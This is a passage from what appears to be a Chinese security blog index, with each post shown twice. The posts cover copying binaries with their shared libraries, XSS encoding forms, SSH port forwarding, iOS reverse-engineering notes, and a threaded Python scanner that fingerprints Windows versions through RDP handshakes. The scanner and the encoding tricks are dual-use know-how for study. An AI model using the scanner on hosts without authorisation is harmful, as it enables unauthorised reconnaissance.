        cp -v --parents &quot;$lib&quot; &quot;$TARGET_FOLDER&quot;
   fi  
done

# I&#39;m on a 64bit system at home. the following code will be not required on a 32bit system.
# however, I&#39;ve not tested that yet
# create lib64 - if required and link the content from lib to it
if [ ! -d &quot;$TARGET_FOLDER&#x2F;lib64&quot; ] ; then
    mkdir -v &quot;$TARGET_FOLDER&#x2F;lib64&quot;
fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>用法: <code>exportbin.sh &lt;path to the binary&gt;  &lt;target floder&gt;</code></p>
<ul>
<li><a target="_blank" rel="noopener" href="http://www.metashock.de/2012/11/export-binary-with-lib-dependencies/">http://www.metashock.de/2012/11/export-binary-with-lib-dependencies/</a></li>
</ul>

	

	</div>
  <a type="button" href="/2017/03/09/copy-shared-lib.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>需求： 从一台Linux复制命令到另外一台上面，由于命令依赖动态库，比如gcc:</p>
<pre class="line-numbers language-none"><code class="language-none">ldd &#96;which gcc&#96;
	linux-vdso.so.1 &#x3D;&gt;  (0x00007fffdb7eb000)
	libc.so.6 &#x3D;&gt; &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 (0x00007fcf12441000)
	&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 (0x000055a28350c000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>这种情况下单单复制gcc没卵用，google了下找到某个bash脚本:</p>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;bash

if [ $# !&#x3D; 2 ] ; then
    echo &quot;usage $0 PATH_TO_BINARY TARGET_FOLDER&quot;
    exit 1
fi

PATH_TO_BINARY&#x3D;&quot;$1&quot;
TARGET_FOLDER&#x3D;&quot;$2&quot;

# if we cannot find the the binary we have to abort
if [ ! -f &quot;$PATH_TO_BINARY&quot; ] ; then
    echo &quot;The file &#39;$PATH_TO_BINARY&#39; was not found. Aborting!&quot;
    exit 1
fi

# copy the binary to the target folder
# create directories if required
echo &quot;---&gt; copy binary itself&quot;
cp --parents -v &quot;$PATH_TO_BINARY&quot; &quot;$TARGET_FOLDER&quot;

# copy the required shared libs to the target folder
# create directories if required
echo &quot;---&gt; copy libraries&quot;
for lib in &#96;ldd &quot;$PATH_TO_BINARY&quot; | cut -d&#39;&gt;&#39; -f2 | awk &#39;&#123;print $1&#125;&#39;&#96; ; do
   if [ -f &quot;$lib&quot; ] ; then
        cp -v --parents &quot;$lib&quot; &quot;$TARGET_FOLDER&quot;
   fi  
done

# I&#39;m on a 64bit system at home. the following code will be not required on a 32bit system.
# however, I&#39;ve not tested that yet
# create lib64 - if required and link the content from lib to it
if [ ! -d &quot;$TARGET_FOLDER&#x2F;lib64&quot; ] ; then
    mkdir -v &quot;$TARGET_FOLDER&#x2F;lib64&quot;
fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>用法: <code>exportbin.sh &lt;path to the binary&gt;  &lt;target floder&gt;</code></p>
<ul>
<li><a target="_blank" rel="noopener" href="http://www.metashock.de/2012/11/export-binary-with-lib-dependencies/">http://www.metashock.de/2012/11/export-binary-with-lib-dependencies/</a></li>
</ul>

	
	</div>
  <a type="button" href="/2017/03/09/copy-shared-lib.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/03/02/xss-encode-decode.html" >xss基础编码</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-03-02  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>html的实体编码，比如十进制编码和十六进制编码，需要放在html标签里面。</p>
<pre class="line-numbers language-none"><code class="language-none">Fun fact Decoding Order:
1. HTML Decoding
2. URL Decoding
3. Javascript Decoding

http:&#x2F;&#x2F;slides.com&#x2F;mscasharjaved&#x2F;deck-13#&#x2F;169<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>三种编码，对于html来说是(10进制和16进制）</p>
<h3 id="html尖括号"><a href="#html尖括号" class="headerlink" title="html尖括号"></a>html尖括号</h3><ul>
<li>十进制：<code>&amp;#60;</code> </li>
<li>html十六: <code>&amp;#x3c;</code></li>
</ul>
<h3 id="javascript的八进制和16进制以及unicode编码"><a href="#javascript的八进制和16进制以及unicode编码" class="headerlink" title="javascript的八进制和16进制以及unicode编码:"></a>javascript的八进制和16进制以及unicode编码:</h3><p>尖括号－－&gt; </p>
<ul>
<li>八进制:<code>\74</code> </li>
<li>十六进制: <code>\x3c</code></li>
<li>unicode编码: <code>\u003c</code></li>
</ul>
<h3 id="url编码及base64编码-lt"><a href="#url编码及base64编码-lt" class="headerlink" title="url编码及base64编码(&lt;)"></a>url编码及base64编码(&lt;)</h3><ul>
<li>url: %3C </li>
<li>base64: PA==</li>
</ul>
	

	</div>
  <a type="button" href="/2017/03/02/xss-encode-decode.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>html的实体编码，比如十进制编码和十六进制编码，需要放在html标签里面。</p>
<pre class="line-numbers language-none"><code class="language-none">Fun fact Decoding Order:
1. HTML Decoding
2. URL Decoding
3. Javascript Decoding

http:&#x2F;&#x2F;slides.com&#x2F;mscasharjaved&#x2F;deck-13#&#x2F;169<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>三种编码，对于html来说是(10进制和16进制）</p>
<h3 id="html尖括号"><a href="#html尖括号" class="headerlink" title="html尖括号"></a>html尖括号</h3><ul>
<li>十进制：<code>&amp;#60;</code> </li>
<li>html十六: <code>&amp;#x3c;</code></li>
</ul>
<h3 id="javascript的八进制和16进制以及unicode编码"><a href="#javascript的八进制和16进制以及unicode编码" class="headerlink" title="javascript的八进制和16进制以及unicode编码:"></a>javascript的八进制和16进制以及unicode编码:</h3><p>尖括号－－&gt; </p>
<ul>
<li>八进制:<code>\74</code> </li>
<li>十六进制: <code>\x3c</code></li>
<li>unicode编码: <code>\u003c</code></li>
</ul>
<h3 id="url编码及base64编码-lt"><a href="#url编码及base64编码-lt" class="headerlink" title="url编码及base64编码(&lt;)"></a>url编码及base64编码(&lt;)</h3><ul>
<li>url: %3C </li>
<li>base64: PA==</li>
</ul>
	
	</div>
  <a type="button" href="/2017/03/02/xss-encode-decode.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/02/28/3389-scan.html" >3389指纹扫描</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-02-28  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>nmap的扫描原理没怎么探索，只知道使用nmap扫描的时候，目标服务器扫不出来东西。特地分析了下3389远程链接的过程。简单来说是这样的：</p>
<ul>
<li>TCP三次握手</li>
<li>客户端发送COTP协议</li>
<li>服务端发送TPKT</li>
</ul>
<p>原来是用socket编程这么简单，只需要抓wireshark，把TCP的数据封装为16进制发送出去就行了。</p>
<p>最后的python脚本是这样的：</p>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;python
# coding: utf-8

import socket
import binascii
import sys
import threading
from Queue import Queue


def verify(sock, port):
	while 1:
		buff &#x3D; sock.recv(2048)
		if not buff:
			break
		b &#x3D; bytearray(buff)
		print &quot;[+] %s&quot; % binascii.hexlify(b)
		detect_os(binascii.hexlify(b), port)
		# if len(binascii.hexlify(b)) &#x3D;&#x3D; 38:
		# 	print &quot;[+] RDP Port is %s&quot; % port
		# 	sys.exit(0)


def detect_os(res, port):
	d &#x3D; &#123;
		&quot;2000&quot;: &quot;0300000b06d00000123400&quot;,
		&quot;2003&quot;: &quot;030000130ed000001234000300080002000000&quot;,
		&quot;2008&quot;: &quot;030000130ed000001234000200080002000000&quot;,
		&quot;win7OR2008R2&quot;: &quot;030000130ed000001234000209080002000000&quot;,
		&quot;2008R2DC&quot;: &quot;030000130ed000001234000201080002000000&quot;,
		&quot;2012R2OR8&quot;: &quot;030000130ed00000123400020f080002000000&quot;
	&#125;
	for key, value in d.iteritems():
		if value &#x3D;&#x3D; res:
			print &quot;[+] Os May be: %s&quot; % key
			print &quot;[+] RDP Port is %s&quot; % port
			sys.exit(0)
def send_payload(sock):
	sock.send(&quot;\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00&quot;)


def worker():
	while not q.empty():
		port &#x3D; q.get()
		try:
			scan(port)
		finally:
			q.task_done()


def scan(port):
	try:
		s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(2)
		sys.stdout.write(&#39;[+] Check Port %s \r&#39; % port)
		sys.stdout.flush()
		if s.connect_ex((ip, port)) &#x3D;&#x3D; 0:
			print &quot;[+] Connect Success %s&quot; % port
			send_payload(s)
			verify(s, port)
	except Exception, e:
		# raise e
		pass
	s.close()

if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
	if len(sys.argv) !&#x3D; 2:
		print &quot;Usage: %s IP&quot; % sys.argv[0]
		sys.exit(0)
	ip &#x3D; sys.argv[1]
	q &#x3D; Queue()
	map(q.put, xrange(3300, 65535))
	threads &#x3D; [threading.Thread(target&#x3D;worker) for i in xrange(50)]
	map(lambda x: x.start(), threads)
	q.join()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


	

	</div>
  <a type="button" href="/2017/02/28/3389-scan.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>nmap的扫描原理没怎么探索，只知道使用nmap扫描的时候，目标服务器扫不出来东西。特地分析了下3389远程链接的过程。简单来说是这样的：</p>
<ul>
<li>TCP三次握手</li>
<li>客户端发送COTP协议</li>
<li>服务端发送TPKT</li>
</ul>
<p>原来是用socket编程这么简单，只需要抓wireshark，把TCP的数据封装为16进制发送出去就行了。</p>
<p>最后的python脚本是这样的：</p>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;python
# coding: utf-8

import socket
import binascii
import sys
import threading
from Queue import Queue


def verify(sock, port):
	while 1:
		buff &#x3D; sock.recv(2048)
		if not buff:
			break
		b &#x3D; bytearray(buff)
		print &quot;[+] %s&quot; % binascii.hexlify(b)
		detect_os(binascii.hexlify(b), port)
		# if len(binascii.hexlify(b)) &#x3D;&#x3D; 38:
		# 	print &quot;[+] RDP Port is %s&quot; % port
		# 	sys.exit(0)


def detect_os(res, port):
	d &#x3D; &#123;
		&quot;2000&quot;: &quot;0300000b06d00000123400&quot;,
		&quot;2003&quot;: &quot;030000130ed000001234000300080002000000&quot;,
		&quot;2008&quot;: &quot;030000130ed000001234000200080002000000&quot;,
		&quot;win7OR2008R2&quot;: &quot;030000130ed000001234000209080002000000&quot;,
		&quot;2008R2DC&quot;: &quot;030000130ed000001234000201080002000000&quot;,
		&quot;2012R2OR8&quot;: &quot;030000130ed00000123400020f080002000000&quot;
	&#125;
	for key, value in d.iteritems():
		if value &#x3D;&#x3D; res:
			print &quot;[+] Os May be: %s&quot; % key
			print &quot;[+] RDP Port is %s&quot; % port
			sys.exit(0)
def send_payload(sock):
	sock.send(&quot;\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00&quot;)


def worker():
	while not q.empty():
		port &#x3D; q.get()
		try:
			scan(port)
		finally:
			q.task_done()


def scan(port):
	try:
		s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(2)
		sys.stdout.write(&#39;[+] Check Port %s \r&#39; % port)
		sys.stdout.flush()
		if s.connect_ex((ip, port)) &#x3D;&#x3D; 0:
			print &quot;[+] Connect Success %s&quot; % port
			send_payload(s)
			verify(s, port)
	except Exception, e:
		# raise e
		pass
	s.close()

if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
	if len(sys.argv) !&#x3D; 2:
		print &quot;Usage: %s IP&quot; % sys.argv[0]
		sys.exit(0)
	ip &#x3D; sys.argv[1]
	q &#x3D; Queue()
	map(q.put, xrange(3300, 65535))
	threads &#x3D; [threading.Thread(target&#x3D;worker) for i in xrange(50)]
	map(lambda x: x.start(), threads)
	q.join()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


	
	</div>
  <a type="button" href="/2017/02/28/3389-scan.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/02/16/ssh-port-forward.html" >SSH端口转发</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-02-16  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>以下几个原则：</p>
<ul>
<li>SSH简单来说就是2台机器之间安全的数据通道，它包括ssh的client和ssh的server2个角色，这样的一条通道就是(ssh tunneling)</li>
<li>SSH端口转发需要ssh连接，同时SSH连接有方向，从SSH Client到SSH Server</li>
<li>同理应用请求也是有方向的，一般是客户端向服务端发出请求</li>
<li>一旦这两个方向相同，称为SSH的本地转发(-L)，反之称为远端转发(-R）</li>
</ul>
<h3 id="本地转发"><a href="#本地转发" class="headerlink" title="本地转发"></a>本地转发</h3><p><code>ssh -L &lt;local port&gt;:&lt;host&gt;:&lt;hostport&gt; &lt;sshserver&gt;</code></p>
<p>通过sshserver建立与host的连接，并将host的hostport绑定到本地的localport端口</p>
<p>应用场景：比如有一台应用服务器appserver（appserver.com），要访问其80端口，但是本地却不能直接访问，于是可以借助一台可以访问appserver的sshserver（sshserver.com）来访问它。<br><code>ssh -L 8000:appserver.com:80  user@sshserver.com</code></p>
<p>ssh链接建立之后，发送到本地8000的包会通过sshserver转发给appserver的80端口</p>
<h3 id="远程转发"><a href="#远程转发" class="headerlink" title="远程转发"></a>远程转发</h3><p><code>ssh -R &lt;remoteport&gt;:&lt;host&gt;:&lt;hostport&gt; &lt;remoteserver&gt;</code><br>远程转发可以通过本地主机，将remoteserver与host连接，host的hostport<br>将会映射到remoteserver的remoteport端口</p>
<p>应用场景: 一台应用服务器appserver(appserver.com），只有本地才能访问80端口，假如remoteserver想访问appserver的80端口，需要通过本地主机做隧道来完成。</p>
	

	</div>
  <a type="button" href="/2017/02/16/ssh-port-forward.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>以下几个原则：</p>
<ul>
<li>SSH简单来说就是2台机器之间安全的数据通道，它包括ssh的client和ssh的server2个角色，这样的一条通道就是(ssh tunneling)</li>
<li>SSH端口转发需要ssh连接，同时SSH连接有方向，从SSH Client到SSH Server</li>
<li>同理应用请求也是有方向的，一般是客户端向服务端发出请求</li>
<li>一旦这两个方向相同，称为SSH的本地转发(-L)，反之称为远端转发(-R）</li>
</ul>
<h3 id="本地转发"><a href="#本地转发" class="headerlink" title="本地转发"></a>本地转发</h3><p><code>ssh -L &lt;local port&gt;:&lt;host&gt;:&lt;hostport&gt; &lt;sshserver&gt;</code></p>
<p>通过sshserver建立与host的连接，并将host的hostport绑定到本地的localport端口</p>
<p>应用场景：比如有一台应用服务器appserver（appserver.com），要访问其80端口，但是本地却不能直接访问，于是可以借助一台可以访问appserver的sshserver（sshserver.com）来访问它。<br><code>ssh -L 8000:appserver.com:80  user@sshserver.com</code></p>
<p>ssh链接建立之后，发送到本地8000的包会通过sshserver转发给appserver的80端口</p>
<h3 id="远程转发"><a href="#远程转发" class="headerlink" title="远程转发"></a>远程转发</h3><p><code>ssh -R &lt;remoteport&gt;:&lt;host&gt;:&lt;hostport&gt; &lt;remoteserver&gt;</code><br>远程转发可以通过本地主机，将remoteserver与host连接，host的hostport<br>将会映射到remoteserver的remoteport端口</p>
<p>应用场景: 一台应用服务器appserver(appserver.com），只有本地才能访问80端口，假如remoteserver想访问appserver的80端口，需要通过本地主机做隧道来完成。</p>
	
	</div>
  <a type="button" href="/2017/02/16/ssh-port-forward.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/02/02/mac-re.html" >IOS逆向入门</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-02-02  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>最后找到了加密的秘钥，找到之后发现整个流程好简单。之前找不到首先不熟悉Object-C的语法，其次就是arm指令，记录如下：</p>
<h2 id="0x01-工具"><a href="#0x01-工具" class="headerlink" title="0x01 工具"></a>0x01 工具</h2><p>首先是要用到的工具，中间主要用了ida，hopper和lldb</p>
<ul>
<li>dumpdecrypted: 将苹果加密过的app砸壳</li>
<li>class-dump: 导出MachO文件里ObjC类及方法定义</li>
<li>CydiaSubstrate: 将第三方动态库注入进程</li>
<li>Cycript: 用js语法写ObjC方法</li>
<li>Theos: 越狱插件开发工具</li>
<li>IDA: 反汇编、反编译工具</li>
<li>Hopper: OSX反汇编、反编译工具</li>
<li>Debugserver + LLDB: 动态调试器</li>
</ul>
<h2 id="0x02-ARM指令"><a href="#0x02-ARM指令" class="headerlink" title="0x02 ARM指令"></a>0x02 ARM指令</h2><pre class="line-numbers language-none"><code class="language-none">arm是RISC结构，数据从内存到CPU之间移动只能通过L&#x2F;S指令来完成，就是ldr&#x2F;str指令
ldr 把数据从内存移到cpu
str 把cpu的数据数据转移到内存
lldb读取内存的数据，memory read &lt;start&gt; &lt;end&gt;
ldr r0, 0x12345678   &#x2F;&#x2F;把0x12345678这个地址中的值存放到r0中
ldr r0, &#x3D;0x12345678  &#x2F;&#x2F;把0x12345678这个地址写到r0中
例子：
COUNT EQU 0x40003100 &#x2F;&#x2F;定义一个COUNT变量，地址是0x40003100
...
LDR R1,&#x3D;COUNT       &#x2F;&#x2F;将COUNT这个变量的地址，也就是0x40003100放到R1中
MOV R0,#0           &#x2F;&#x2F;将立即数0放到R0中
STR R0,[R1]         &#x2F;&#x2F;将R0中的值放到以R1中的值为地址的存储单元去




B 跳转指令
BL 带返回的跳转指令
BLX 带返回和状态切换的跳转指令
BX  带状态切换的跳转指令

BLX指令从ARM指令集跳转到指令中所指定的目标地址，并将处理器的工作状态从ARM切换到Thumb状态，该指令同时将PC的当前内容保存到寄存器R14，因此，当子程序使用Thumb指令集，而调用者者使用ARM指令集，可以通过BLX指令实现子程序的调用和处理器工作状态切换，同时，子程序的返回可以通过将寄存器R14的值复制到PC中来完成。
　R0-R3:　　　　　　　　用于函数参数及返回值的传递，超过4个参数，其它参数存在栈中，在ARM中栈是向下生长的，R0还可以作为返回值。
　　R4-R6, R8, R10-R11:　没有特殊规定，就是普通的通用寄存器
　　R7:　　　　　　　　　　栈帧指针，指向母函数与被调用子函数在栈中的交界。
　　R9:　　　　　　　　　　在iOS3.0被操作系统保留
　　R12:　　　　　　　　　 内部过程调用寄存器，动态链接时会用到，不必深究
　　R13:　　　　　　　　　 SP(stack pointer)，是栈顶指针
　　R14:　　　　　　　　　 LR(link register)，存放函数的返回地址。
　　R15:　　　　　　　　　 PC(program counter)，指向当前指令地址。
ADC 　　 带进位的加法
　　ADD 　　 加法
　　AND 　　 逻辑与
　　B 　　　  分支跳转，很少单独使用
　　BL          分支跳转，跳转后返回地址存入r14
　　BX          分支跳转，并切换指令模式（Thumb&#x2F;ARM）
　　CMP        比较值，结果存在程序状态寄存器，一般用于分支判断
　　BEQ        结果为0则跳转
　　BNE        结果不为0跳转
　　LDR        加载寄存器，从内存加载到寄存器
　　LDRB      装载字节到寄存器
　　LDRH      装载半字到寄存器（一个字是32位）
　　LSL         逻辑左移 这是一个选项，不是指令
　　LSR         逻辑右移 这是一个选项，不是指令
　　MOV        传送值&#x2F;寄存器到一个寄存器 
　　STR         存储一个寄存器，寄存器值存到内存
　　STRB       存储一个字节
　　STRH       存储一个半字
　　SUB         减法
　　PUSH POP 堆栈操作

有时候需要

db  ；定义字节类型变量，一个字节数据占一个字节单元，读完一个偏移量加1
dw  ；定义字类型变量，一个字数据占2个字节单元，读完一个，偏移量加2
dd  ；定义双字类型变量，一个双字数据占4个字节单元，读完一个，偏移量加4

IDA给某个位置命名的时，它会使用该位置的虚拟地址和表示一个该地址的类型的前缀进行命名：
sub_xxx  ；地址xxx处的子例程
loc_xxx  ；地址xxx处的一个指令
byte_xxx ；位置xxx处的8位数据
word_xxx ;位置xxx处的16位数据
dword_xxx ;位置xxx处的32位数据
unk_xxx   ;位置xxx处大小未知的数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>关于sp，bp等栈寄存器的解释：</p>
<pre class="line-numbers language-none"><code class="language-none">
SP is stack pointer. The stack is generally used to hold &quot;automatic&quot; variables and context&#x2F;parameters across function calls. Conceptually you can think of the &quot;stack&quot; as a place where you &quot;pile&quot; your data. You keep &quot;stacking&quot; one piece of data over the other and the stack pointer tells you how &quot;high&quot; your &quot;stack&quot; of data is. You can remove data from the &quot;top&quot; of the &quot;stack&quot; and make it shorter.


&lt;https:&#x2F;&#x2F;www.zybuluo.com&#x2F;oro-oro&#x2F;note&#x2F;137244&gt;
&lt;http:&#x2F;&#x2F;cryptroix.com&#x2F;2016&#x2F;10&#x2F;16&#x2F;journey-to-the-stack&#x2F;&gt;
&lt;http:&#x2F;&#x2F;en.citizendium.org&#x2F;wiki&#x2F;Stack_frame&gt;
虽然是英文，但是看起来要比中文易懂<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ida里面有三种颜色的箭头:</p>
<ol>
<li>蓝色，顺序执行</li>
<li>绿色，条件为(YES)</li>
<li>红色，条件为（NO）</li>
</ol>
	

	</div>
  <a type="button" href="/2017/02/02/mac-re.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>最后找到了加密的秘钥，找到之后发现整个流程好简单。之前找不到首先不熟悉Object-C的语法，其次就是arm指令，记录如下：</p>
<h2 id="0x01-工具"><a href="#0x01-工具" class="headerlink" title="0x01 工具"></a>0x01 工具</h2><p>首先是要用到的工具，中间主要用了ida，hopper和lldb</p>
<ul>
<li>dumpdecrypted: 将苹果加密过的app砸壳</li>
<li>class-dump: 导出MachO文件里ObjC类及方法定义</li>
<li>CydiaSubstrate: 将第三方动态库注入进程</li>
<li>Cycript: 用js语法写ObjC方法</li>
<li>Theos: 越狱插件开发工具</li>
<li>IDA: 反汇编、反编译工具</li>
<li>Hopper: OSX反汇编、反编译工具</li>
<li>Debugserver + LLDB: 动态调试器</li>
</ul>
<h2 id="0x02-ARM指令"><a href="#0x02-ARM指令" class="headerlink" title="0x02 ARM指令"></a>0x02 ARM指令</h2><pre class="line-numbers language-none"><code class="language-none">arm是RISC结构，数据从内存到CPU之间移动只能通过L&#x2F;S指令来完成，就是ldr&#x2F;str指令
ldr 把数据从内存移到cpu
str 把cpu的数据数据转移到内存
lldb读取内存的数据，memory read &lt;start&gt; &lt;end&gt;
ldr r0, 0x12345678   &#x2F;&#x2F;把0x12345678这个地址中的值存放到r0中
ldr r0, &#x3D;0x12345678  &#x2F;&#x2F;把0x12345678这个地址写到r0中
例子：
COUNT EQU 0x40003100 &#x2F;&#x2F;定义一个COUNT变量，地址是0x40003100
...
LDR R1,&#x3D;COUNT       &#x2F;&#x2F;将COUNT这个变量的地址，也就是0x40003100放到R1中
MOV R0,#0           &#x2F;&#x2F;将立即数0放到R0中
STR R0,[R1]         &#x2F;&#x2F;将R0中的值放到以R1中的值为地址的存储单元去




B 跳转指令
BL 带返回的跳转指令
BLX 带返回和状态切换的跳转指令
BX  带状态切换的跳转指令

BLX指令从ARM指令集跳转到指令中所指定的目标地址，并将处理器的工作状态从ARM切换到Thumb状态，该指令同时将PC的当前内容保存到寄存器R14，因此，当子程序使用Thumb指令集，而调用者者使用ARM指令集，可以通过BLX指令实现子程序的调用和处理器工作状态切换，同时，子程序的返回可以通过将寄存器R14的值复制到PC中来完成。
　R0-R3:　　　　　　　　用于函数参数及返回值的传递，超过4个参数，其它参数存在栈中，在ARM中栈是向下生长的，R0还可以作为返回值。
　　R4-R6, R8, R10-R11:　没有特殊规定，就是普通的通用寄存器
　　R7:　　　　　　　　　　栈帧指针，指向母函数与被调用子函数在栈中的交界。
　　R9:　　　　　　　　　　在iOS3.0被操作系统保留
　　R12:　　　　　　　　　 内部过程调用寄存器，动态链接时会用到，不必深究
　　R13:　　　　　　　　　 SP(stack pointer)，是栈顶指针
　　R14:　　　　　　　　　 LR(link register)，存放函数的返回地址。
　　R15:　　　　　　　　　 PC(program counter)，指向当前指令地址。
ADC 　　 带进位的加法
　　ADD 　　 加法
　　AND 　　 逻辑与
　　B 　　　  分支跳转，很少单独使用
　　BL          分支跳转，跳转后返回地址存入r14
　　BX          分支跳转，并切换指令模式（Thumb&#x2F;ARM）
　　CMP        比较值，结果存在程序状态寄存器，一般用于分支判断
　　BEQ        结果为0则跳转
　　BNE        结果不为0跳转
　　LDR        加载寄存器，从内存加载到寄存器
　　LDRB      装载字节到寄存器
　　LDRH      装载半字到寄存器（一个字是32位）
　　LSL         逻辑左移 这是一个选项，不是指令
　　LSR         逻辑右移 这是一个选项，不是指令
　　MOV        传送值&#x2F;寄存器到一个寄存器 
　　STR         存储一个寄存器，寄存器值存到内存
　　STRB       存储一个字节
　　STRH       存储一个半字
　　SUB         减法
　　PUSH POP 堆栈操作

有时候需要

db  ；定义字节类型变量，一个字节数据占一个字节单元，读完一个偏移量加1
dw  ；定义字类型变量，一个字数据占2个字节单元，读完一个，偏移量加2
dd  ；定义双字类型变量，一个双字数据占4个字节单元，读完一个，偏移量加4

IDA给某个位置命名的时，它会使用该位置的虚拟地址和表示一个该地址的类型的前缀进行命名：
sub_xxx  ；地址xxx处的子例程
loc_xxx  ；地址xxx处的一个指令
byte_xxx ；位置xxx处的8位数据
word_xxx ;位置xxx处的16位数据
dword_xxx ;位置xxx处的32位数据
unk_xxx   ;位置xxx处大小未知的数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>关于sp，bp等栈寄存器的解释：</p>
<pre class="line-numbers language-none"><code class="language-none">
SP is stack pointer. The stack is generally used to hold &quot;automatic&quot; variables and context&#x2F;parameters across function calls. Conceptually you can think of the &quot;stack&quot; as a place where you &quot;pile&quot; your data. You keep &quot;stacking&quot; one piece of data over the other and the stack pointer tells you how &quot;high&quot; your &quot;stack&quot; of data is. You can remove data from the &quot;top&quot; of the &quot;stack&quot; and make it shorter.


&lt;https:&#x2F;&#x2F;www.zybuluo.com&#x2F;oro-oro&#x2F;note&#x2F;137244&gt;
&lt;http:&#x2F;&#x2F;cryptroix.com&#x2F;2016&#x2F;10&#x2F;16&#x2F;journey-to-the-stack&#x2F;&gt;
